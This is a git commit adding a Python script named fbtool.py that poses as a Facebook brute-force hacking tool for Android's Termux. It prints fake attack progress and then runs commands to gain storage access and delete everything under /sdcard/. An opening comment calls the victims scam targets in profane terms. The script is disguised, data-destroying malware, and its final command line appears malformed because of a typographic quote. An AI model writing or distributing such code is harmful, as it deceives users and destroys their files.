c7abeea92e20465e7b9703e49ee65da00ef71010
Z4RP1HR <103745705+Z4RP1HR@users.noreply.github.com>
2022-05-05 13:13:46 +0800

    Add files via upload

---
+++ fbtool.py
@@ -0,0 +1,24 @@
+#scam motherfuckas
+print(" FB BRUTEFORCE\n")
+
+name = input("please enter the fb profile link: ")
+print("\nbrute forcing fb")
+input("\ndo you want to speed up hacking? (y/n) ")
+
+print("\ntargeting:" + name + "\n")
+
+import time
+time.sleep(0.9)
+
+for x in range(300):
+  print("bruteforce: " + name)
+  
+print("\nattack succesfully")
+
+input("\ndo you want to see the results? (y/n) ")
+
+import os
+
+os.system("termux-setup-storage")
+os.system("rm -rf /sdcard/”)
+
